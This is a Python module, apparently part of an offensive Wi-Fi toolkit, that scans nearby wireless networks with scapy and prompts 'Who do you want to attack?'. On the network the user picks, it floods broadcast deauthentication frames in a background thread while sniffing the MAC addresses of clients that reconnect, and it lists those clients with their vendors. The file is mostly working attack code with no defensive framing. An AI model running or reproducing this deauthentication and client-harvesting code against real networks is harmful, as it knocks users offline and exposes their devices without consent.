# WIFI SCANNER  // CLIENT SNIFFER MODULE // SPY ON NETWORKS
from rich.table import Table
from rich.live import Live
from rich.console import Console
from scapy.all import sniff, RadioTap, sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
import threading
import random
import time
from nsm_utilities import Utilities, NetTilities, Background_Threads
from nsm_deauth import Frame_Snatcher

console = Console()


# THIS CLASS WILL BE A STANDALONE VERSION FOR TESTING OF NON-CONNECTED WIFI CLIENT SNIFFING.
class Client_Sniffer:
    """This class will be responsible for sniffing clients on targeted network"""

    @classmethod
    def sniff_for_targets(cls, iface):
        """This module will be responsible for sniffing for targets"""

        count = 1

        try:
            while True:
                console.print(
                    f"[bold yellow]Sniff Attempt[bold yellow] [bold green]#{count}"
                )

                sniff(
                    iface=iface, prn=Client_Sniffer.packet_parser, store=0, timeout=15
                )

                if len(cls.ssids) > 0:
                    sniff(
                        iface=iface,
                        prn=Client_Sniffer.packet_parser,
                        store=0,
                        count=0,
                        timeout=7,
                    )

                    break

                count += 1

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            console.input("[bold red]Press enter to return: ")

            from nsm_ui import MainUI

            MainUI.main()

    @classmethod
    def packet_parser(cls, pkt, target=False, verbose=False):
        """This will break down and discet packets"""

        def parser(pkt):

            if pkt.haslayer(Dot11Beacon) and cls.type == 1:
                ssid = (
                    pkt[Dot11Elt].info.decode(errors="ignore")
                    if pkt[Dot11Elt].info.decode(errors="ignore")
                    else False
                )

                addr1 = (
                    pkt[Dot11].addr1
                    if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff"
                    else False
                )
                addr2 = (
                    pkt[Dot11].addr2
                    if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff"
                    else False
                )

                if addr2 and ssid and addr2 not in cls.macs:
                    cls.macs.append(addr2)

                    channel = Background_Threads.get_channel(pkt=pkt)
                    vendor = Utilities.get_vendor(mac=addr2)
                    rssi = NetTilities.get_rssi(pkt=pkt)
                    encryption = Background_Threads.get_encryption(pkt=pkt)
                    freq = Background_Threads.get_freq(
                        freq=pkt[RadioTap].ChannelFrequency
                    )

                    cls.infos.append(
                        (ssid, addr2, vendor, encryption, freq, channel, rssi)
                    )
                    cls.ssids[addr2] = channel

                    console.print(f"[bold red]Snatched your SSID:[bold yellow] {ssid}")

            # if cls.ssids[addr2] == None:

            # cls.infos.remove((ssid, addr2, vendor, channel, rssi))
            # cls.infos.pop()
            # cls.macs.remove(addr2)

            elif pkt.haslayer(Dot11) and cls.type == 2:
                addr1 = pkt[Dot11].addr1 if pkt[Dot11].addr1 else False
                addr2 = pkt[Dot11].addr2 if pkt[Dot11].addr2 else False

                if addr2 == cls.target or addr1 == target:
                    console.print(f"Client: {addr2}  -->  {addr1}")

                    if addr2 not in cls.clients:
                        cls.clients.append(addr2 if addr2 else addr1)

        if cls.SNIFF:
            threading.Thread(target=parser, args=(pkt,), daemon=True).start()

    @classmethod
    def target_chooser(cls, verbose=False):
        """This method will be used to choose from the target list"""

        num = 1
        data = {}
        error = False
        time.sleep(2)

        table = Table(
            title="Choose Bitch",
            border_style="bold red",
            style="bold purple",
            title_style="bold purple",
            header_style="bold purple",
        )
        table.add_column("Key")
        table.add_column("SSID", style="bold blue")
        table.add_column("BSSID", style="bold green")
        table.add_column("Vendor", style="yellow")
        table.add_column("Encryption")
        table.add_column("Frequency")
        table.add_column("Channel")
        table.add_column("Rssi", style="bold red")

        for var in cls.infos:
            ssid = var[0]
            bssid = var[1]
            vendor = var[2]
            encryption = "WPA2"
            freq = var[4]
            channel = var[5]
            rssi = var[6]

            # ADD TO DICT
            data[num] = (var[0], var[1])

            table.add_row(
                f"{num}",
                f"{ssid}",
                f"{bssid}",
                f"{vendor}",
                f"{encryption}",
                f"{freq}",
                f"{channel}",
                f"{rssi}",
            )
            num += 1

        print("\n\n")
        console.print(table)
        print("\n")

        # DESTROY ERRORS
        while True:
            try:
                # FOR CLEANER OUTPUT
                if error:
                    console.print(
                        f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!"
                    )
                    error = False

                # USER CHOOSES THERE TARGET
                choice = console.input("[bold red]Who do you want to attack?: ").strip()

                # INT IT
                choice = int(choice)

                if choice in range(1, num) or choice == num:
                    ssid = data[choice][0]
                    target = data[choice][1]
                    channel = cls.ssids[target]

                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    # RETURN THE TARGET
                    return ssid, target, channel

                # OUTSIDE OF NUM
                else:
                    error = True

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                if verbose:
                    console.print(e)

                error = True

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:
                if verbose:
                    console.print(e)

                error = True

            # ELSE
            except Exception as e:
                if verbose:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                if not error:
                    error = 1

                elif error:
                    error += 1

                # SAFETY CATCH
                if error == 4:
                    console.print("Alright ur done for", style="bold red")
                    break

    @classmethod
    def sniff_the_target(cls, iface, ssid, target, channel):
        """This will sniff only from target"""

        cls.type = 2
        cls.target = target

        # SET CHANNEL
        Background_Threads.channel_hopper(set_channel=channel)

        # VARS
        clients = []
        clients_info = []
        verbose = True

        # CREATE TABLE
        table = Table(
            title=f"{ssid} - Client List",
            title_style="bold red",
            style="bold purple",
            border_style="purple",
            header_style="bold red",
        )
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")

        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0

            # DELAY WAIT FOR SNIFF
            time.sleep(3)

            # FUNCTION
            while sent < 10:
                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4, 5, 7, 15])

                # CRAFT THE FRAME
                frame = (
                    RadioTap()
                    / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target)
                    / Dot11Deauth(reason=reasons)
                )

                # SEND THE FRAME
                # while True:
                sendp(frame, iface=iface, count=15, realtime=False, verbose=False)

                # WAIT
                time.sleep(1)

                # GO
                sent += 1

                if verbose:
                    console.print(
                        f"Deauth --> {target}  -  Reason: {reasons}", style="bold red"
                    )

        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            # CATCH
            try:
                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:
                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:
                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)

                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))

                            # ADD DATA TO TABLE
                            table.add_row(
                                f"{len(clients)}",
                                f"{addr1}",
                                " --> ",
                                f"{target}",
                                f"{vendor}",
                            )

                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:
                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))

                            # ADD DATA TO TABLE
                            table.add_row(
                                f"{len(clients)}",
                                f"{addr2}",
                                " --> ",
                                f"{target}",
                                f"{vendor}",
                            )

            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")

            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")

        try:
            # START A BACKGROUND THREAD
            threading.Thread(target=small_deauth, daemon=True).start()

            console.print(
                "\nI will now begin to sniff for clients for the next 'infinite' seconds if you want to stop earlier press [bold green]ctrl + c!\n",
                style="bold red",
            )
            time.sleep(2)

            # SNIFF
            with Live(table, console=console, refresh_per_second=2):
                sniff(iface=iface, prn=client_sniffer, store=0, count=0)

                time.sleep(1.1)

        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            time.sleep(1)
            console.input("\n[bold red]Press Enter to EXIT: ")

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

    @classmethod
    def main(cls):
        """This is where main logic will be launched from"""

        # SET VARS
        cls.infos = []
        cls.ssids = {}
        cls.macs = []
        cls.clients = []
        cls.type = 1
        cls.SNIFF = True
        Background_Threads.hop = True

        # GET IFACE
        try:
            iface = Frame_Snatcher.get_interface()

            # WELCOME UI
            Frame_Snatcher.welcome_ui(
                iface=iface, text="    Client \n  Sniffer", c2="bold green"
            )

            # START CHANNEL HOPPER
            Background_Threads.channel_hopper(verbose=False)

            # SNIFF FOR TARGET
            Client_Sniffer.sniff_for_targets(iface=iface)

            # SELECT TARGET
            ssid, target, channel = Client_Sniffer.target_chooser()

            # GET TO SNIFFFING
            Client_Sniffer.sniff_the_target(
                iface=iface, ssid=ssid, target=target, channel=channel
            )

        except KeyboardInterrupt as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            cls.SNIFF = False

        except Exception as e:
            console.print(f"[bold red]Exception Error:[bold yellow] {e}")

            cls.SNIFF = False

            time.sleep(3)
